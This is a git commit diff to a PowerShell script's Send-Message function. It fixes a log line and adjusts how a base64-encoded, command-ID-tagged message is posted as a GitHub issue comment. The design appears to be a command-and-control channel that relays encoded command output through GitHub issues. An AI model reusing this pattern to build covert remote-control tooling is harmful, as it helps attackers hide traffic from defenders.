b2f9dc775d752c0789d0490ab354a4c81b65fe59
BeinnUais1 <47501353+BeinnUais1@users.noreply.github.com>
2019-04-13 13:41:27 -0400

    Update DefaultPackage.ps1

--- DefaultPackage.ps1
+++ DefaultPackage.ps1
@@ -36,10 +36,10 @@ function Send-Message
                 Write-Console -Message ("Default switch entered.")
                 Write-Console -Message ("body is currently set to " + $body)
                 $encodedBody = [System.Convert]::ToBase64String([System.Text.Encoding]::UNICODE.GetBytes($body))
-                Write-Console -Message ("encodedBody is currently set to " + $body)
+                Write-Console -Message ("encodedBody is currently set to " + $encodedBody)
                 $mergedBody = "[" + $commandID + "]:" + $encodedBody
                 Write-Console -Message ("Merged body is " + $mergedBody)
-			    New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body $mergedBody
+			    New-GitHubComment -OwnerName $user -RepositoryName $repository -Issue $issue -Body ($mergedBody)
                 break
             }
         }
